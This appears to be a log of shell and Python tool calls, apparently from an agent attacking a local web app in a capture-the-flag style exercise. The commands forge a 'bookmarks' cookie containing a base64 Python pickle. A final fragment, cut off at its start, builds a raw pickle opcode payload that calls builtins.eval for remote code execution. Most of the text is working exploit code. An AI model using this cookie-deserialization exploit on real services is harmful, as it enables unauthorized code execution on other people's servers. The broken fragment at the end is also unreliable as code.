args.cmd:
rm -f /tmp/cj3.txt; curl -s -c /tmp/cj3.txt http://localhost:80/list > /dev/null; echo '--- initial cookies ---'; cat /tmp/cj3.txt; echo; echo '--- overwrite bookmarks ---'; python3 - << 'PY'
import io,sys
cj='''# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
localhost	FALSE	/	FALSE	0	user	PLACE
localhost	FALSE	/	FALSE	0	bookmarks	PLACE2
'''
import base64, pickle
payload = base64.b64encode(pickle.dumps([{'name':'Injected','url':'http://x'}],0)).decode()
# read existing jar to get user
with open('/tmp/cj3.txt','r') as f:
    lines=f.read().splitlines()
user=None
for line in lines:
    if line and not line.startswith('#'):
        parts=line.split('\t')
        if parts[5]=='user':
            user=parts[6]
if not user:
    user='abc'
# write new jar
with open('/tmp/cj3.txt','w') as f:
    f.write(cj.replace('PLACE',user).replace('PLACE2',payload))
print(payload)
PY
cat /tmp/cj3.txt; echo; echo '--- GET /list with injected cookie ---'; curl -s -i -b /tmp/cj3.txt http://localhost:80/list | sed -n '1,200p'

args.cmd:
python3 - << 'PY'
import base64, pickle
payload = base64.b64encode(pickle.dumps([{'name':'Injected','url':'http://x'}],0)).decode()
print('PAYLOAD', payload)
# read existing jar to get user
user=None
with open('/tmp/cj3.txt','r') as f:
    for line in f:
        if line and not line.startswith('#'):
            parts=line.split('\t')
            if parts[5]=='user':
                user=parts[6].strip()
                break
if user is None:
    user='abc'
content=f"# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n# This file was generated by libcurl! Edit at your own risk.\n\nlocalhost\tFALSE\t/\tFALSE\t0\tuser\t{user}\nlocalhost\tFALSE\t/\tFALSE\t0\tbookmarks\t{payload}\n"
open('/tmp/cj3.txt','w').write(content)
print(open('/tmp/cj3.txt').read())
PY
curl -s -i -b /tmp/cj3.txt http://localhost:80/list | sed -n '1,200p'

payload = b"cbuiltins
eval
(S"" + s.encode() + b""
tR."
import base64
print(base64.b64encode(payload).decode())
PY
); printf "# Netscape HTTP Cookie File

localhost	FALSE	/	FALSE	0	user	X
localhost	FALSE	/	FALSE	0	bookmarks	%s
" "$PAY" > /tmp/cj6.txt; curl -s -i -b /tmp/cj6.txt http://localhost:80/list | sed -n '1,200p'
